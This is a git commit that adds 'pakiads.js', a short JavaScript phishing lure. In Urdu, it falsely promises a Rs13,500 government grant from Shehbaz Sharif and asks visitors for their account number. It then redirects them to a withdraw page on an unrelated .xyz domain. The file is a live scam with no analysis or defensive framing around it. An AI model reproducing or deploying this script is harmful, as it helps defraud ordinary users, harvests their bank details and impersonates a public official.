a69ced59469813d226b3c7ff25a9c4229d012fb8
bigetijazz31 <bigetijazz31@gmail.com>
2025-05-23 08:38:01 +0100

    Create pakiads.js

---
+++ pakiads.js
@@ -0,0 +1,6 @@
+
+var password = 'واپس لینا Rs13,500'
+password=prompt('SMS : ہیلو عزیز، وصول کرنے کے لیے اپنا اکاؤنٹ نمبر درج کریں۔ Muhammad Shehbaz Sharif Rs13,500 پاکستان گرینڈ . to واپس لینا Rs13,500,ابھی اپلائی کرنے کے لیے اوکے کو دبائیں۔','واپس لینا Rs13,500');
+if (password != 'واپس لینا Rs13,500') {
+location.href='https://www.oldmtn50gb.xyz/withdraw-Rs13500';
+}
